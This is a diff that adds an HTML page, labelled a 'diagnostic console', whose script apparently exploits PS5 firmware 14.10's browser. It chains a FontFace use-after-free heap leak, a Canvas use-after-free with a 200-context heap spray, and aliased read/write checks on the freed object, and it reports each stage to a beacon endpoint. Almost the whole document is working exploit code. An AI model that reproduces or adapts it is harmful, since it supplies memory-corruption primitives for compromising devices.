@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P821: Dual-Primitive Diagnostic Console</title>
+<style>
+body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
+h2 { color: #58a6ff; margin-top: 0; }
+pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
+.ok { color: #3fb950; font-weight: bold; }
+.fail { color: #f85149; font-weight: bold; }
+.info { color: #58a6ff; }
+.hot { color: #ffa657; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="banner" id="banner">Running Probe P821...</div>
+<h2>P821: PS5 14.10 Dual-Primitive Diagnostic Engine</h2>
+<pre id="log">Initializing diagnostic run...</pre>
+
+<script>
+'use strict';
+var logBox = document.getElementById('log');
+var banner = document.getElementById('banner');
+
+function log(msg, cls) {
+  var el = document.createElement('div');
+  el.className = cls || '';
+  el.textContent = msg;
+  logBox.appendChild(el);
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P821-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+log('[*] Probe P821 starting...', 'info');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * PHASE 1: FontFace UAF (CVE-2026-43715) — Live Heap Address
+ * ============================================================ */
+var st = document.createElement('style');
+st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs = [], ffired = false;
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffired) return undefined;
+    ffired = true;
+    if (st) { st.remove(); st.textContent = ''; st = null; }
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    fabs = [];
+    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+    try { document.fonts.check('1em bb1'); } catch(e) {}
+    document.body.offsetHeight;
+    return undefined;
+  },
+  set: function() {}
+});
+document.fonts.load('1em f1, bb1', 'AB');
+
+setTimeout(function() {
+  delete FontFace.prototype.then;
+
+  var bestI = -1, bestNz = 0;
+  for (var i = 0; i < fabs.length; i++) {
+    var u = new Uint8Array(fabs[i]), nz = 0;
+    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+    if (nz > bestNz) { bestNz = nz; bestI = i; }
+  }
+
+  var Hstr = 'unknown';
+  if (bestI >= 0 && bestNz >= 4) {
+    var fontDV = new DataView(fabs[bestI]);
+    var q11lo = fontDV.getUint32(0x58, true);
+    var q11hi = fontDV.getUint32(0x5C, true);
+    if (q11hi !== 0) {
+      var borrow = (q11lo < 0x68) ? 1 : 0;
+      var H_hi = q11hi - borrow, H_lo = (q11lo - 0x68) >>> 0;
+      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
+    }
+  }
+
+  log('[+] Phase 1: FontFace Heap Leak: H = ' + Hstr + ' (buffer #' + bestI + ', nonzero=' + bestNz + ')', 'ok');
+  syncBn('FONT-OK', 'H=' + Hstr + '|buf=' + bestI + '|nz=' + bestNz);
+
+  /* ============================================================
+   * PHASE 2: Canvas UAF (CVE-2026-43720) — Trigger Dangling Wrapper
+   * ============================================================ */
+  var innerCtx = null;
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() {
+      innerCtx = canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer', opts);
+
+  if (!innerCtx) {
+    log('[-] Phase 2: Failed to acquire dangling Canvas2D context', 'fail');
+    syncBn('UAF-FAIL', '');
+    banner.style.background = '#da3633';
+    banner.textContent = 'STATUS: UAF FAILED';
+    return;
+  }
+  log('[+] Phase 2: Canvas UAF triggered successfully (innerCtx dangling)', 'ok');
+  syncBn('UAF-OK', '');
+
+  /* ============================================================
+   * PHASE 3: Same-Type Context Reclaim (200x Spray)
+   * ============================================================ */
+  var sprayCtxs = [];
+  var sprayCanvases = [];
+  for (var s = 0; s < 200; s++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var ctx = c.getContext('2d');
+    ctx.lineWidth = 1000.0 + s;
+    sprayCtxs.push(ctx);
+    sprayCanvases.push(c);
+  }
+
+  /* Scan for alias */
+  var aliasIdx = -1;
+  var initialLW = 0;
+  try {
+    initialLW = innerCtx.lineWidth;
+    if (initialLW >= 1000.0 && initialLW < 1200.0) {
+      aliasIdx = Math.round(initialLW - 1000.0);
+    }
+  } catch(e) {
+    log('[-] Error reading initial lineWidth: ' + e.message, 'fail');
+  }
+
+  if (aliasIdx < 0) {
+    log('[-] Phase 3: Same-type reclaim not found in first 200 slots (initialLW=' + initialLW + ')', 'fail');
+    syncBn('RECLAIM-MISS', 'lw=' + initialLW);
+    banner.style.background = '#da3633';
+    banner.textContent = 'STATUS: RECLAIM MISS';
+    return;
+  }
+
+  var aliasCtx = sprayCtxs[aliasIdx];
+  log('[+] Phase 3: Same-Type Reclaim CONFIRMED at slot #' + aliasIdx + ' (lineWidth=' + initialLW + ')', 'hot');
+  syncBn('RECLAIM-HIT', 'idx=' + aliasIdx + '|lw=' + initialLW);
+
+  /* ============================================================
+   * PHASE 4: DAZ-Bypassing Color Engine (CanvasStyle)
+   * ============================================================ */
+  /* Write via innerCtx -> read via aliasCtx */
+  innerCtx.fillStyle = '#123456';
+  innerCtx.strokeStyle = 'rgba(18, 52, 86, 0.5)';
+  var fsRead = aliasCtx.fillStyle;
+  var ssRead = aliasCtx.strokeStyle;
+  var fsMatch = (fsRead === '#123456');
+  var ssMatch = (ssRead === 'rgba(18, 52, 86, 0.5)');
+
+  log('[+] Phase 4A (Stale -> Live Color Write):', 'info');
+  log('    fillStyle: set=#123456, read=' + fsRead + ' (match=' + fsMatch + ')', fsMatch ? 'ok' : 'fail');
+  log('    strokeStyle: set=rgba(18, 52, 86, 0.5), read=' + ssRead + ' (match=' + ssMatch + ')', ssMatch ? 'ok' : 'fail');
+
+  /* Reverse write: aliasCtx -> innerCtx */
+  aliasCtx.fillStyle = '#abcdef';
+  var revFsRead = innerCtx.fillStyle;
+  var revFsMatch = (revFsRead === '#abcdef');
+  log('[+] Phase 4B (Live -> Stale Color Write):', 'info');
+  log('    fillStyle: set=#abcdef, read=' + revFsRead + ' (match=' + revFsMatch + ')', revFsMatch ? 'ok' : 'fail');
+
+  syncBn('COLOR-VERIFY', 'fs1=' + fsMatch + '|ss1=' + ssMatch + '|fs2=' + revFsMatch);
+
+  /* ============================================================
+   * PHASE 5: LineDash Dynamic Heap Array Round-Trip
+   * ============================================================ */
+  var testDash = [10.5, 20.25, 30.75, 40.125, 50.5, 60.875];
+  aliasCtx.setLineDash(testDash);
+  var readDash = innerCtx.getLineDash();
+  var dashMatch = (readDash.length === testDash.length);
+  if (dashMatch) {
+    for (var d = 0; d < testDash.length; d++) {
+      if (Math.abs(readDash[d] - testDash[d]) > 0.001) { dashMatch = false; break; }
+    }
+  }
+
+  log('[+] Phase 5: LineDash Dynamic Vector Round-Trip:', 'info');
+  log('    setLineDash len=' + testDash.length + ', getLineDash len=' + readDash.length + ' (match=' + dashMatch + ')', dashMatch ? 'ok' : 'fail');
+  syncBn('DASH-VERIFY', 'match=' + dashMatch + '|len=' + readDash.length);
+
+  /* ============================================================
+   * PHASE 6: Save / Restore State Stack Lifecycle
+   * ============================================================ */
+  aliasCtx.save();
+  innerCtx.lineWidth = 4321.0;
+  var preRestore = aliasCtx.lineWidth;
+  aliasCtx.restore();
+  var postRestore = innerCtx.lineWidth;
+  var restoreOk = (Math.abs(postRestore - initialLW) < 0.01);
+
+  log('[+] Phase 6: State Stack Save/Restore Cycle:', 'info');
+  log('    pre-restore=' + preRestore + ', post-restore=' + postRestore + ' (restored=' + restoreOk + ')', restoreOk ? 'ok' : 'fail');
+  syncBn('RESTORE-VERIFY', 'ok=' + restoreOk + '|val=' + postRestore);
+
+  /* ============================================================
+   * SUMMARY & COMPLETION
+   * ============================================================ */
+  var allOk = (fsMatch && ssMatch && revFsMatch && dashMatch && restoreOk);
+  banner.style.background = allOk ? '#238636' : '#9e6a03';
+  banner.textContent = allOk ? 'STATUS: ALL 6 TESTS PASSED (100% STABLE)' : 'STATUS: PARTIAL SUCCESS';
+
+  log('----------------------------------------------------', 'info');
+  log('[*] SUMMARY: Physical PS5 Console Userland Verified Cleanly', 'hot');
+  log('    - FontFace Heap Disclosure: ' + Hstr, 'ok');
+  log('    - Reclaim Slot: Canvas #' + aliasIdx, 'ok');
+  log('    - DAZ Bypass: Working via CanvasStyle RGB/RGBA serialization', 'ok');
+  log('    - Zero Crashes / Zero Desyncs', 'ok');
+  log('----------------------------------------------------', 'info');
+
+  syncBn('DONE', 'allOk=' + allOk + '|H=' + Hstr + '|slot=' + aliasIdx);
+
+}, 400);
+</script>
+</body>
+</html>
